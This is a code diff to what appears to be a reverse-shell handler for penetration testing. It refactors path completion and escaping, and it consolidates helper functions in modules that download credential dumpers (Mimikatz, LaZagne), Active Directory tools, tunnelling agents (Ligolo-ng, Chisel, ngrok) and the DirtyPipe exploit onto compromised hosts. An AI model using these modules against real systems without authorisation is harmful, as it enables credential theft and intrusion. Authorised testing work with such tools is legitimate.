@@ -807,15 +807,35 @@ class BetterCMD:
 			return None
 
 	@staticmethod
-	def file_completer(text):
-		matches = glob(os.path.expanduser(text) + '*')
+	def complete_path(line, begidx, endidx, lister, expand=lambda p: p):
+		head, j, arg_start = line[:endidx], 0, 0
+		while j < len(head):
+			if head[j] == '\\':
+				j += 2
+				continue
+			if head[j] == ' ':
+				arg_start = j + 1
+			j += 1
+		unescaped      = line[arg_start:endidx].replace('\\ ', ' ')
+		pattern        = expand(unescaped)
+		prefix_escaped = line[arg_start:begidx]
 		results = []
-		for m in matches:
+		for m in lister(pattern):
+			if not m.startswith(pattern):
+				continue
+			escaped = (unescaped + m[len(pattern):]).replace(' ', '\\ ')
+			if escaped.startswith(prefix_escaped):
+				results.append(escaped[len(prefix_escaped):])
+		return results
+
+	@staticmethod
+	def _local_lister(pattern):
+		out = []
+		for m in glob(pattern + '*'):
 			if os.path.isdir(m):
 				m += '/'
-			m = m.replace(' ', '\\ ')
-			results.append(m)
-		return results
+			out.append(m)
+		return out
 
 ##########################################################################################################
 
@@ -957,7 +977,7 @@ class MainMenu(BetterCMD):
 		if not path:
 			print(paint(os.getcwd()).yellow)
 		else:
-			path = Path(path).expanduser().resolve()
+			path = Path(path.replace('\\ ', ' ')).expanduser().resolve()
 			try:
 				os.chdir(path)
 				logger.info(f"Penelope's current directory changed to: {paint(path).yellow}")
@@ -1663,16 +1683,15 @@ class MainMenu(BetterCMD):
 		return [iface for iface in Interfaces().list if iface.startswith(text)]
 
 	def complete_upload(self, text, line, begidx, endidx):
-		return __class__.file_completer(text)
+		return self.complete_path(line, begidx, endidx, self._local_lister, expand=lambda p: os.path.expandvars(os.path.expanduser(p)))
 
-	def complete_cd(self, text, line, begidx, endidx):
-		return __class__.file_completer(text)
+	complete_script = complete_upload
+	complete_cd = complete_upload
 
 	def complete_download(self, text, line, begidx, endidx):
-		return core.sessions[self.sid].get_remote_completion(text)
+		return self.complete_path(line, begidx, endidx, core.sessions[self.sid].get_remote_completion)
 
-	def complete_open(self, text, line, begidx, endidx):
-		return core.sessions[self.sid].get_remote_completion(text)
+	complete_open = complete_download
 
 	def complete_use(self, text, line, begidx, endidx):
 		return self.get_core_id_completion(text, "none")
@@ -2144,10 +2163,11 @@ class TCPListener:
 		self.jump = []
 		if jump:
 			for j in jump:
-				try:
-					self.jump.append(tuple(j.split(':')))
-				except:
-					logger.error(f"Invalid jump endpoint: {j}")
+				host, sep, port = j.rpartition(':')
+				if not sep or not host or not port.isdigit():
+					logger.error(f"Invalid jump endpoint: {j} (expected host:port)")
+					continue
+				self.jump.append((host, port))
 
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -2680,14 +2700,14 @@ class Session:
 				)
 				result = self.exec(code, python=True, value=True)
 				if result:
-					return [line.replace(' ', '\\ ') for line in result.splitlines()]
+					return result.splitlines()
 
 			elif self.OS == 'Unix':
 				safe_pattern = shlex.quote(text) + "*"
 				cmd = f"ls -p -1 -d {safe_pattern} 2>/dev/null"
 				result = self.exec(cmd, value=True)
 				if result:
-					return [line.replace(' ', '\\ ') for line in result.splitlines()]
+					return result.splitlines()
 
 			elif self.OS == 'Windows':
 				win_text = text.replace('/', '\\')
@@ -2697,7 +2717,7 @@ class Session:
 				if result:
 					if any(err in result for err in ["File Not Found", "The system cannot find", "Volume in drive"]):
 						return []
-					return [line.replace(' ', '\\ ') for line in result.splitlines()]
+					return result.splitlines()
 		except Exception:
 			pass
 
@@ -3822,7 +3842,7 @@ class Session:
 
 				tar_source, mode = stdout_stream, "r|gz"
 			else:
-				remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
+				remote_items = ' '.join([shlex.quote(os.path.join(self.cwd, part)) for part in shlex.split(remote_items)])
 				temp = self.tmp + "/" + rand(8)
 				cmd = rf'tar -czf - {"-h " if options.link_dereference else ""}{remote_items}|base64|tr -d "\n" > {temp}'
 				response = self.exec(cmd, timeout=None, value=True)
@@ -4375,7 +4395,7 @@ class Session:
 			with open(local_script, "wb") as input_file:
 				input_file.write(data)
 		else:
-			local_script = Path(normalize_path(local_script))
+			local_script = Path(normalize_path(local_script.replace('\\ ', ' ')))
 
 		output_file_name = local_script_folder / (prefix + "output.txt")
 
@@ -5048,6 +5068,60 @@ def agent():
 	os._exit(0)
 
 
+def upload_extracted_archive(session, url, name, flatten=False, remote_path=None):
+	_, archive = url_to_bytes(url)
+	if not archive:
+		logger.error(f"Failed to download {name}")
+		return False
+	with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+		if flatten:
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				z.extractall(tmpdir)
+			entries = list(Path(tmpdir).iterdir())
+			if not entries:
+				logger.error(f"{name} archive was empty")
+				return False
+			folder = entries[0].parent / name
+			os.rename(entries[0], folder)
+		else:
+			folder = Path(tmpdir) / name
+			folder.mkdir(parents=True, exist_ok=True)
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				z.extractall(folder)
+		return session.upload(str(folder), remote_path=remote_path)
+
+
+def upload_single_from_archive(session, url, member, arcname, remote_path=None):
+	_, archive = url_to_bytes(url)
+	if not archive:
+		logger.error(f"Failed to download {arcname}")
+		return False
+	buf = io.BytesIO(archive)
+	if member is None:                       # single-stream gzip
+		with gzip.GzipFile(fileobj=buf, mode="rb") as g:
+			data = g.read()
+	elif zipfile.is_zipfile(buf):
+		buf.seek(0)
+		with zipfile.ZipFile(buf) as z:
+			try:
+				data = z.read(member)
+			except KeyError:
+				logger.error(f"File '{member}' not found in downloaded archive")
+				return False
+	else:                                    # tar.gz
+		buf.seek(0)
+		with tarfile.open(fileobj=buf, mode="r:gz") as tf:
+			try:
+				f = tf.extractfile(tf.getmember(member))
+			except KeyError:
+				f = None
+			if f is None:
+				logger.error(f"File '{member}' not found in downloaded archive")
+				return False
+			data = f.read()
+	return session.upload(url, url_to_bytes_fn=lambda x: (arcname, data), remote_path=remote_path)
+
+
 def modules():
 	return {module.__name__:module for module in Module.__subclasses__()}
 
@@ -5230,18 +5304,6 @@ class traitor(Module):
 class upload_credump_scripts(Module):
 	category = "Credential Dumping"
 
-	def upload_mimikatz(session):
-		_, archive = url_to_bytes(URLS['mimikatz'])
-		if not archive:
-			logger.error("Failed to download Mimikatz")
-			return
-		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-			target = Path(tmpdir) / "mimikatz"
-			target.mkdir(parents=True, exist_ok=True)
-			with zipfile.ZipFile(io.BytesIO(archive)) as z:
-				z.extractall(target)
-			session.upload(str(target))
-
 	def run(session, args):
 		"""
 		Upload {Mimikatz, LaZagne, Snaffler, SharpWeb}
@@ -5255,7 +5317,7 @@ class upload_credump_scripts(Module):
 			requested = [t.lower() for t in args.split()] if args else []
 
 			tools = {
-				"mimikatz": __class__.upload_mimikatz,
+				"mimikatz": lambda session: upload_extracted_archive(session, URLS['mimikatz'], "mimikatz"),
 				"lazagne": lambda session: session.upload(URLS['lazagne']),
 				"snaffler": lambda session: session.upload(URLS['snaffler']),
 				"sharpweb": lambda session: session.upload(URLS['sharpweb'])
@@ -5279,35 +5341,6 @@ class upload_credump_scripts(Module):
 class upload_ad_scripts(Module):
 	category = "Active Directory"
 
-	def upload_sharphound(session):
-		_, archive = url_to_bytes(URLS['sharphound'])
-		if not archive:
-			logger.error("Failed to download SharpHound")
-			return
-		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-			target = Path(tmpdir) / "sharphound"
-			target.mkdir(parents=True, exist_ok=True)
-			with zipfile.ZipFile(io.BytesIO(archive)) as z:
-				z.extractall(target)
-			session.upload(str(target))
-
-	def upload_ghostpack(session):
-		_, archive = url_to_bytes(URLS['ghostpack'])
-		if not archive:
-			logger.error("Failed to download GhostPack")
-			return
-		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-			with zipfile.ZipFile(io.BytesIO(archive)) as z:
-				z.extractall(tmpdir)
-				extracted = list(Path(tmpdir).iterdir())
-				if not extracted:
-					logger.error("GhostPack archive was empty")
-					return
-				extracted_folder = extracted[0]
-				renamed_folder = extracted_folder.parent / "ghostpack"
-				os.rename(extracted_folder, renamed_folder)
-				session.upload(str(renamed_folder))
-
 	def run(session, args):
 		"""
 		Upload {PowerView, SharpHound, GhostPack, adPEAS}
@@ -5322,8 +5355,8 @@ class upload_ad_scripts(Module):
 
 			tools = {
 				"powerview": lambda session: session.upload(URLS['powerview']),
-				"sharphound": __class__.upload_sharphound,
-				"ghostpack":  __class__.upload_ghostpack,
+				"sharphound": lambda session: upload_extracted_archive(session, URLS['sharphound'], "sharphound"),
+				"ghostpack":  lambda session: upload_extracted_archive(session, URLS['ghostpack'], "ghostpack", flatten=True),
 				"adpeas":     lambda session: session.upload(URLS['adpeas']),
 			}
 
@@ -5422,17 +5455,7 @@ class ligolo(Module):
 				logger.error("Ligolo-ng: No predefined binary to upload.")
 				print()
 				return
-
-			_, archive = url_to_bytes(url)
-			if not archive:
-				logger.error("Ligolo-ng: download failed")
-				return
-			with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tf:
-				f = tf.extractfile(tf.getmember("agent"))
-				if f is None:
-					logger.error("File 'agent' not found in downloaded archive")
-					return
-				session.upload(url, url_to_bytes_fn=lambda x: ('agent', f.read()))
+			upload_single_from_archive(session, url, "agent", "agent")
 
 		elif session.OS == 'Windows':
 			if session.arch == "x64-based_PC":
@@ -5441,17 +5464,7 @@ class ligolo(Module):
 				logger.error("Ligolo-ng: No predefined binary to upload.")
 				print()
 				return
-
-			_, archive = url_to_bytes(url)
-			if not archive:
-				logger.error("Ligolo-ng: download failed")
-				return
-			with zipfile.ZipFile(io.BytesIO(archive)) as z:
-				try:
-					session.upload(url, url_to_bytes_fn=lambda x: ('agent.exe', z.read("agent.exe")))
-				except KeyError:
-					logger.error("File 'agent' not found in downloaded archive")
-					return
+			upload_single_from_archive(session, url, "agent.exe", "agent.exe")
 
 
 class chisel(Module):
@@ -5471,13 +5484,7 @@ class chisel(Module):
 				logger.error("Chisel: No predefined binary to upload.")
 				print()
 				return
-
-			_, archive = url_to_bytes(url)
-			if not archive:
-				logger.error("Chisel: download failed")
-				return
-			with gzip.GzipFile(fileobj=io.BytesIO(archive), mode="rb") as g:
-				session.upload(url, url_to_bytes_fn=lambda x: ('chisel', g.read()))
+			upload_single_from_archive(session, url, None, "chisel")
 
 		elif session.OS == 'Windows':
 			if session.arch == "x64-based_PC":
@@ -5488,17 +5495,7 @@ class chisel(Module):
 				logger.error("Chisel: No predefined binary to upload.")
 				print()
 				return
-
-			_, archive = url_to_bytes(url)
-			if not archive:
-				logger.error("Chisel: download failed")
-				return
-			with zipfile.ZipFile(io.BytesIO(archive)) as z:
-				try:
-					session.upload(url, url_to_bytes_fn=lambda x: ('chisel.exe', z.read("chisel.exe")))
-				except KeyError:
-					logger.error("File 'chisel' not found in downloaded archive")
-					return
+			upload_single_from_archive(session, url, "chisel.exe", "chisel.exe")
 
 
 class ngrok(Module):
@@ -5517,16 +5514,7 @@ class ngrok(Module):
 			if session.arch != 'x86_64':
 				logger.error(f"No prebuilt ngrok binary for arch '{session.arch}'")
 				return False
-			_, archive = url_to_bytes(URLS['ngrok_linux'])
-			if not archive:
-				logger.error("Failed to download ngrok")
-				return
-			with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tf:
-				f = tf.extractfile(tf.getmember("ngrok"))
-				if f is None:
-					logger.error("File 'ngrok' not found in downloaded archive")
-					return
-				session.upload(URLS['ngrok_linux'], url_to_bytes_fn=lambda x: ('ngrok', f.read()), remote_path=session.exec_tmp)
+			upload_single_from_archive(session, URLS['ngrok_linux'], "ngrok", "ngrok", remote_path=session.exec_tmp)
 
 			token = input("Authtoken: ")
 			session.exec(f"{session.exec_tmp}/ngrok config add-authtoken {token}")
@@ -5578,21 +5566,8 @@ class upload_local_exploits(Module):
 			logger.error("This module runs only on Linux shells")
 			return
 
-		_, archive = url_to_bytes(URLS['dirtypipe_zip'])
-		if not archive:
-			logger.error("Failed to download DirtyPipe")
+		if not upload_extracted_archive(session, URLS['dirtypipe_zip'], "dirtypipe", flatten=True):
 			return
-		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-			with zipfile.ZipFile(io.BytesIO(archive)) as z:
-				z.extractall(tmpdir)
-				extracted = list(Path(tmpdir).iterdir())
-				if not extracted:
-					logger.error("DirtyPipe archive was empty")
-					return
-				extracted_folder = extracted[0]
-				renamed_folder = extracted_folder.parent / "dirtypipe"
-				os.rename(extracted_folder, renamed_folder)
-				session.upload(str(renamed_folder))
 		logger.info("DirtyPipe uploaded. Compile on target: cd dirtypipe && gcc exploit-1.c -o exploit-1  ||  gcc exploit-2.c -o exploit-2")
 
 	def run(session, args):
